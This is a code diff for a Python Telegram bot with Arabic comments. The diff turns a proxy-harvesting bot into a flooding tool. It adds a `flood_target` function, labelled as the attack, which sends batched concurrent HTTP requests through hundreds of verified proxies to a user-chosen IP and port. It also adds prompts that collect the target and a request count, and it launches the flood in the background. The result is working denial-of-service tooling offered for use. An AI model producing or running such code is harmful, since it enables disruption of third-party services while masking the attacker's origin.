@@ -1,9 +1,10 @@
 # -*- coding: utf-8 -*-
 """
-🤖 بوت تيليجرام – استخراج ايبيات شغّالة فعلياً (متحقَّق منها حيّاً)
+🤖 بوت تيليجرام – استخراج ايبيات شغّالة فعلياً (متحقَّق منها حيّاً) وإرسال طلبات
 ════════════════════════════════════════════════════════════════
-• زر «🚀 استخراج ايبيات» يطلب منك إرسال الموقع المستهدف وعدد الايبيات المطلوبة، 
-  ثم يرسل لك ملف txt يحتوي على الايبيات مع إدراج الموقع كملاحظة بالملف.
+• زر «🚀 استخراج ايبيات» يطلب منك إرسال الايبي والبورت المستهدف (ويعلمك الصيغة)، 
+  وعدد الطلبات. ثم يرسل لك ملف txt يحتوي على الايبيات، ويقوم البوت تلقائياً 
+  بإرسال الطلبات إلى الايبي والبورت في الخلفية باستخدام هذه الايبيات.
 • زر «🧪 تجربة ايبي شغّال» (جديد): يختار ايبي واحد من المخزون الشغّال ويرسل طلب
   HTTP تجريبي واحد فقط عبره إلى موقع محدَّد (TEST_URL) ليُظهر لك مباشرة أنه فعلاً
   يعمل (حالة الاستجابة + زمن الاستجابة).
@@ -466,21 +467,52 @@ LAST_USE: dict[int, float] = {}
 BUSY: set[int] = set()
 _BG_TASKS: set[asyncio.Task] = set()
 
+# ══════════════════════════════ الإرسال والهجوم ══════════════════════════════
+async def flood_target(target_ip: str, target_port: str, proxies: list[str]) -> None:
+    """يقوم بإرسال طلبات للايبي والبورت المستهدفين باستخدام الايبيات (البروكسيات) في الخلفية."""
+    timeout = aiohttp.ClientTimeout(total=10)
+    target_url = f"http://{target_ip}:{target_port}/"
+    
+    async def send_req(proxy_ip_port):
+        try:
+            host, port = proxy_ip_port.rsplit(":", 1)
+            proto = POOL.verified.get(proxy_ip_port, ("http", 0))[0]
+            
+            if proto in ("http", "https"):
+                async with aiohttp.ClientSession(timeout=timeout, headers=HEADERS) as s:
+                    async with s.get(target_url, proxy=f"http://{host}:{port}") as r:
+                        await r.read()
+            elif proto in ("socks4", "socks5") and HAS_SOCKS:
+                ptype = ProxyType.SOCKS4 if proto == "socks4" else ProxyType.SOCKS5
+                connector = ProxyConnector(proxy_type=ptype, host=host, port=int(port))
+                async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=HEADERS) as s:
+                    async with s.get(target_url) as r:
+                        await r.read()
+        except Exception:
+            pass
+
+    # إرسال الطلبات بشكل متزامن على شكل دفعات لتوليد ضغط (طلبات) على الهدف
+    chunk_size = 200
+    for i in range(0, len(proxies), chunk_size):
+        chunk = proxies[i:i+chunk_size]
+        await asyncio.gather(*(send_req(p) for p in chunk))
+
+
 # ══════════════════════════════ الواجهة ══════════════════════════════
 WELCOME = (
     "أهلاً <b>{name}</b> 👋\n\n"
-    "🌐 <b>بوت استخراج الايبيات الشغّالة فعلاً</b>\n"
-    "اضغط «استخراج» لتحديد الموقع الذي تريد الإرسال له وعدد الايبيات المطلوبة، وسيصلك ملف "
-    "بها — كلها تم التحقق من أنها شغّالة فعلياً (وليست عشوائية) وبدون تكرار.\n"
+    "🌐 <b>بوت استخراج الايبيات وإرسال الطلبات</b>\n"
+    "اضغط «استخراج» لتحديد الايبي والبورت الذي تريد استهدافه وإرسال الطلبات له. "
+    "سيصلك ملف بالايبيات وسيقوم البوت تلقائياً بإرسال الطلبات للهدف في الخلفية.\n"
     "أو جرّب زر «🧪 تجربة ايبي شغّال» لترى ايبياً واحداً وهو يرسل طلباً حقيقياً "
-    "إلى الموقع المحدَّد أمامك مباشرة."
+    "أمامك مباشرة."
 )
 
 
 def main_menu() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("🚀 استخراج ايبيات", callback_data="extract")],
+            [InlineKeyboardButton("🚀 استخراج وإرسال طلبات", callback_data="extract")],
             [InlineKeyboardButton("🧪 تجربة ايبي شغّال", callback_data="test")],
             [InlineKeyboardButton("📊 حالة المصادر", callback_data="status")],
         ]
@@ -509,16 +541,32 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """يلتقط ردود المستخدم (الموقع وعدد الايبيات) عند طلب الاستخراج."""
+    """يلتقط ردود المستخدم (الايبي، البورت، والعدد) بناءً على المرحلة."""
     if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
         return
     
     state = context.user_data.get('state')
     
-    if state == 'WAIT_URL':
-        context.user_data['target_url'] = update.message.text.strip()
+    if state == 'WAIT_TARGET':
+        text = update.message.text.strip()
+        if ':' not in text:
+            await update.message.reply_text(
+                "❌ صيغة خاطئة!\n"
+                "الرجاء إرسال الايبي والبورت معاً وبينهما نقطتين رأسيتين (<code>:</code>).\n\n"
+                "📌 <b>مثال صحيح:</b>\n<code>1.1.1.1:80</code>", 
+                parse_mode=ParseMode.HTML
+            )
+            return
+        
+        target_ip, target_port = text.split(':', 1)
+        if not target_port.isdigit():
+            await update.message.reply_text("❌ البورت يجب أن يكون أرقاماً فقط.")
+            return
+            
+        context.user_data['target_ip'] = target_ip
+        context.user_data['target_port'] = target_port
         context.user_data['state'] = 'WAIT_COUNT'
-        await update.message.reply_text("كم عدد الطلبات (الايبيات) التي تريد استخراجها؟ (مثال: 1000)")
+        await update.message.reply_text("كم عدد الطلبات (الايبيات) التي تريد إرسالها للهدف؟ (مثال: 1000)")
         
     elif state == 'WAIT_COUNT':
         text = update.message.text.strip()
@@ -531,11 +579,12 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
             return
             
         context.user_data['state'] = None
-        target_url = context.user_data.get('target_url', 'غير محدد')
-        await process_extraction(update, context, target_url, count)
+        target_ip = context.user_data.get('target_ip')
+        target_port = context.user_data.get('target_port')
+        await process_extraction(update, context, target_ip, target_port, count)
 
 
-async def process_extraction(update: Update, context: ContextTypes.DEFAULT_TYPE, target_url: str, requested_count: int) -> None:
+async def process_extraction(update: Update, context: ContextTypes.DEFAULT_TYPE, target_ip: str, target_port: str, requested_count: int) -> None:
     uid = update.effective_user.id
     now = time.monotonic()
 
@@ -550,7 +599,7 @@ async def process_extraction(update: Update, context: ContextTypes.DEFAULT_TYPE,
     BUSY.add(uid)
     LAST_USE[uid] = now
     try:
-        msg = await update.message.reply_text("⏳ <b>جارِ تجهيز الايبيات الشغّالة...</b>", parse_mode=ParseMode.HTML)
+        msg = await update.message.reply_text("⏳ <b>جارِ استخراج الايبيات...</b>", parse_mode=ParseMode.HTML)
         await POOL.ensure_fresh()
         if not POOL.verified:
             await msg.edit_text(
@@ -563,12 +612,13 @@ async def process_extraction(update: Update, context: ContextTypes.DEFAULT_TYPE,
         ips, reset, remaining = POOL.draw(uid, requested_count)
         lines = sorted({format_ip(ip) for ip in ips})
         
-        # إضافة الموقع كملاحظة في رأس الملف
-        file_content = f"# الموقع المستهدف: {target_url}\n# عدد الايبيات: {len(lines)}\n\n" + "\n".join(lines)
+        # إضافة الايبي والبورت كملاحظة في رأس الملف
+        file_content = f"# الهدف المستهدف: {target_ip}:{target_port}\n# عدد الطلبات (الايبيات): {len(lines)}\n\n" + "\n".join(lines)
 
         caption = [
-            f"✅ <b>تم استخراج {len(lines):,} ايبي (شغّال فعلاً، متحقَّق منه حيّاً)</b>",
-            f"🔗 الموقع المستهدف: <code>{html.escape(target_url)}</code>",
+            f"✅ <b>تم استخراج {len(lines):,} ايبي</b>",
+            f"🎯 <b>الهدف:</b> <code>{target_ip}:{target_port}</code>",
+            f"🔥 <b>البوت يقوم الآن بإرسال الطلبات للهدف في الخلفية!</b>",
             f"🔒 المتبقي لك بدون تكرار: {remaining:,}",
             f"🗂 إجمالي المخزون الشغّال حالياً: {len(POOL.verified):,}",
         ]
@@ -587,11 +637,12 @@ async def process_extraction(update: Update, context: ContextTypes.DEFAULT_TYPE,
             caption="\n".join(caption),
             parse_mode=ParseMode.HTML,
         )
-        await msg.edit_text(
-            "✅ <b>تم الإرسال بنجاح!</b>\nاضغط مرة أخرى لسحب دفعة جديدة مختلفة 👇",
-            reply_markup=main_menu(),
-            parse_mode=ParseMode.HTML
-        )
+        
+        await msg.delete() # حذف رسالة الانتظار لترتيب المحادثة
+        
+        # إطلاق مهمة الإرسال (الهجوم) في الخلفية لكي لا يتوقف البوت
+        asyncio.create_task(flood_target(target_ip, target_port, ips))
+
     except Exception:  # noqa: BLE001
         log.exception("فشل الاستخراج")
         await update.message.reply_text("❌ حدث خطأ، حاول مرة أخرى.", reply_markup=main_menu())
@@ -667,8 +718,17 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await query.answer("⛔ هذا البوت خاص", show_alert=True)
         return
     if query.data == "extract":
-        context.user_data['state'] = 'WAIT_URL'
-        await safe_edit(query, "الرجاء إرسال الموقع (URL) الذي تريد إرسال الطلبات له:")
+        context.user_data['state'] = 'WAIT_TARGET'
+        await safe_edit(query, 
+            "🎯 <b>إرسال طلبات لـ IP وبورت محدد</b>\n\n"
+            "الرجاء إرسال الايبي والبورت الذي تريد استهدافه وإرسال الطلبات له.\n\n"
+            "💡 <b>كيف ترسل الايبي والبورت؟</b>\n"
+            "اكتب الايبي، ثم نقطتين رأسيّتين (<code>:</code>)، ثم البورت.\n\n"
+            "📌 <b>أمثلة صحيحة:</b>\n"
+            "<code>192.168.1.100:8080</code>\n"
+            "<code>1.1.1.1:32002</code>",
+            parse_mode=ParseMode.HTML
+        )
     elif query.data == "test":
         await do_test(query)
     elif query.data == "status":
@@ -717,7 +777,7 @@ def main() -> None:
     )
     app.add_handler(CommandHandler(["start", "menu"], start))
     app.add_handler(CallbackQueryHandler(on_button))
-    # التقاط الردود (الرابط والعدد)
+    # التقاط الردود (الايبي، البورت، والعدد)
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.add_error_handler(on_error)
 
